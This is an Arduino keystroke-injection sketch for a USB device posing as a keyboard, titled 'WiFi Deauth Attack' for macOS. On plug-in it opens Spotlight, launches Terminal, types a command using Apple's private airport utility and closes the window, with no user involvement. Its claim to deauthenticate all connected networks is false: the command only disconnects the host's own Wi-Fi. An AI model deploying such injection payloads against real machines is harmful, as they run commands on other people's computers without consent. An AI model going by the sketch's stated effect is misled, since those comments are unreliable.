#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Deauth all connected WiFi networks
  // NOTE: Requires airport utility (install airport from macOS pkg)
  // Author: Generated
  // Title: WiFi Deauth Attack
  // Target: macOS
  // Version: 1.0
  // Category: Network-Attacks
  // ID 05ac:021e Apple:Keyboard
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("if /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s | grep -q ''; then /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -z; fi");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("echo 'Deauth sent'");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}